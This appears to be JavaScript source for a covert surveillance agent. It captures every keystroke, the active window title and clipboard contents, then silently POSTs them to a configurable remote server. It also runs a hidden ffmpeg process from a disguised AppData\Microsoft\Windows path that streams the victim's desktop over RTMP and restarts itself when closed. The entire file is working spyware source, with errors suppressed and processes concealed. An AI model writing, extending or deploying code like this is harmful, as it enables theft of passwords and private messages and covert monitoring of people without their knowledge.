const keylogger = require("./src/index");
const { GlobalKeyboardListener } = require("node-global-key-listener");
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

class ConfigManager {
    constructor() {
        this.configPath = path.join(__dirname, '.config');
        this.config = this.loadConfig();
        this.watcher = null;
        this.subscribers = new Set();
    }

    loadConfig() {
        try {
            const configData = fs.readFileSync(this.configPath, 'utf8');
            return JSON.parse(configData);
        } catch (error) {
            return {
                agent_id: "default_agent",
                key: {
                    send_interval: 5000,
                    send_url: "http://localhost:80/agent/keylog"
                },
                screen: {
                    framerate: 30,
                    level: 4.2,
                    profilev: "high",
                    bufsize: "2000k"
                }
            };
        }
    }

    subscribe(callback) {
        this.subscribers.add(callback);
        return () => this.subscribers.delete(callback);
    }

    startWatching() {
        if (this.watcher) {
            this.watcher.close();
        }

        this.watcher = fs.watch(this.configPath, (eventType) => {
            if (eventType === 'change') {
                this.config = this.loadConfig();
                this.subscribers.forEach(callback => callback(this.config));
            }
        });
    }

    stopWatching() {
        if (this.watcher) {
            this.watcher.close();
            this.watcher = null;
        }
    }

    getConfig() {
        return this.config;
    }
}

class MarcyKey {
    constructor(configManager) {
        this.configManager = configManager;
        this.config = configManager.getConfig();
        
        this.currentText = '';
        this.currentWindow = '';
        this.isShiftPressed = false;
        this.isCtrlPressed = false;
        this.isAltPressed = false;
        this.specialKeyStates = {};
        this.isEnabled = false;
        
        this.specialKeys = {
            'Shift': '[Shift]',
            'Control': '[Ctrl]',
            'Alt': '[Alt]',
            'Meta': '[Win]',
            'Enter': '[Enter]',
            'Backspace': '[Backspace]',
            'Tab': '[Tab]',
            'Escape': '[Esc]',
            'Spacebar': ' ',
            'ArrowLeft': '[←]',
            'ArrowRight': '[→]',
            'ArrowUp': '[↑]',
            'ArrowDown': '[↓]',
            'Delete': '[Del]',
            'Insert': '[Ins]',
            'Home': '[Home]',
            'End': '[End]',
            'PageUp': '[PgUp]',
            'PageDown': '[PgDn]',
            'CapsLock': '[Caps]',
            'PrintScreen': '[PrtSc]'
        };

        this.unsubscribe = this.configManager.subscribe((newConfig) => {
            this.config = newConfig;
        });
    }

    cleanWindowTitle(title) {
        if (!title || title === 'Task Switching' || title.trim() === '') {
            return '';
        }
        title = title.replace(/^[*?] /, '');
        title = title.replace(/[*?]$/, '');
        if (title.includes(" - ")) {
            return title;
        }
        return title.trim();
    }

    formatWindowHeader(windowTitle) {
        const now = new Date();
        const timestamp = now.toISOString();
        const cleanTitle = this.cleanWindowTitle(windowTitle);
        return `[${timestamp}] [● ${cleanTitle}]`;
    }

    async sendData(data, windowTitle = '') {
        try {
            const timestamp = new Date().toISOString();
            const url = `${this.config.protocol}://${this.config.server}/agent/keylog`;
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    agent_id: this.config.agent_id,
                    text: data,
                    window: windowTitle,
                    timestamp: timestamp
                })
            });
        } catch (error) {
            // Silent error handling
        }
    }

    handleKeylogger(key, isKeyUp, keyCode, windowTitle, clipboardData) {
        if (!this.isEnabled) return;

        const cleanedWindowTitle = this.cleanWindowTitle(windowTitle);
        if (this.currentWindow !== cleanedWindowTitle && cleanedWindowTitle.trim()) {
            if (this.currentText) {
                this.sendData(this.currentText, this.currentWindow);
            }
            this.currentWindow = cleanedWindowTitle;
            this.currentText = '';
            const header = this.formatWindowHeader(windowTitle);
            this.sendData(header, cleanedWindowTitle);
        }

        if (clipboardData) {
            const clipboardLog = `[Clipboard Data]${clipboardData}`;
            this.sendData(clipboardLog, cleanedWindowTitle);
        }

        if (key === 'Shift') this.isShiftPressed = !isKeyUp;
        if (key === 'Control') this.isCtrlPressed = !isKeyUp;
        if (key === 'Alt') this.isAltPressed = !isKeyUp;

        if (this.specialKeys[key] && !isKeyUp && !this.specialKeyStates[key]) {
            this.specialKeyStates[key] = true;
            if (key === 'Backspace') {
                this.currentText = this.currentText.slice(0, -1);
            } else {
                this.currentText += this.specialKeys[key];
            }
        }
        else if (this.specialKeys[key] && isKeyUp) {
            this.specialKeyStates[key] = false;
        }
        else if (!isKeyUp) {
            if (key === 'Spacebar') {
                this.currentText += ' ';
            } else if (this.isShiftPressed) {
                this.currentText += key.toUpperCase();
            } else {
                this.currentText += key.toLowerCase();
            }
        }
        else if (key.startsWith('F') && !isKeyUp && !this.specialKeyStates[key]) {
            this.specialKeyStates[key] = true;
            this.currentText += `[${key}]`;
        }
        else if (key.startsWith('F') && isKeyUp) {
            this.specialKeyStates[key] = false;
        }

        if (key === 'Enter' && !isKeyUp) {
            this.sendData(this.currentText, this.currentWindow);
            this.currentText = '';
        }
    }

    start() {
        this.isEnabled = true;
        keylogger.start(this.handleKeylogger.bind(this));
        
        setInterval(() => {
            if (this.isEnabled && this.currentText) {
                this.sendData(this.currentText, this.currentWindow);
                this.currentText = '';
            }
        }, this.config.key.send_interval);
    }

    stop() {
        this.isEnabled = false;
        keylogger.stop();
        this.unsubscribe();
    }
}

class MarcyScreen {
    constructor(configManager) {
        this.configManager = configManager;
        this.config = configManager.getConfig();
        this.isEnabled = false;
        this.process = null;
        this.streamKey = this.config.agent_id;

        this.unsubscribe = this.configManager.subscribe((newConfig) => {
            this.config = newConfig;
            if (this.isEnabled) {
                this.stop();
                this.start();
            }
        });
    }

    start() {
        if (this.isEnabled) return;
        
        this.isEnabled = true;

        const ffmpegArgs = [
            '-f', 'gdigrab',
            '-framerate', this.config.screen.framerate.toString(),
            '-i', 'desktop',
            '-c:v', 'libx264',
            '-preset', 'veryfast',
            '-tune', 'zerolatency',
            '-profile:v', this.config.screen.profilev,
            '-level', this.config.screen.level.toString(),
            '-pix_fmt', 'yuv420p',
            '-b:v', '8000k',
            '-maxrate', '8000k',
            '-bufsize', this.config.screen.bufsize,
            '-g', this.config.screen.framerate.toString(),
            '-keyint_min', this.config.screen.framerate.toString(),
            '-sc_threshold', '0',
            '-crf', '18',
            '-f', 'flv',
            `rtmp://${this.config.server}:${this.config.rtmpPort}/live/${this.streamKey}?name=${encodeURIComponent(this.teacherName)}`
        ];

        const ffmpegPath = path.join(process.env.LOCALAPPDATA || process.env.APPDATA, 'Microsoft', 'Windows', 'ffmpeg', 'bin', 'ffmpeg.exe');
        this.process = spawn(ffmpegPath, ffmpegArgs, {windowsHide: true});

        this.process.stderr.on('data', (data) => {
            // Silent FFmpeg output
        });

        this.process.on('close', (code) => {
            if (this.isEnabled) {
                this.start();
            }
        });

        this.process.on('error', (err) => {
            this.isEnabled = false;
        });
    }

    stop() {
        if (!this.isEnabled) return;
        
        this.isEnabled = false;
        if (this.process) {
            this.process.kill();
            this.process = null;
        }
    }

    setTeacherName(name) {
        this.teacherName = name;
        this.streamKey = name.toLowerCase().replace(/\s+/g, '-');
        
        if (this.isEnabled) {
            this.stop();
            this.start();
        }
    }

    getStreamInfo() {
        return {
            teacherName: this.teacherName,
            streamKey: this.streamKey,
            rtmpUrl: `rtmp://${this.config.server}:${this.config.rtmpPort}/live/${this.streamKey}?name=${encodeURIComponent(this.teacherName)}`
        };
    }
}

// Create a singleton ConfigManager instance
const configManager = new ConfigManager();
configManager.startWatching();

module.exports = {
    MarcyKey: () => new MarcyKey(configManager),
    MarcyScreen: () => new MarcyScreen(configManager)
}; 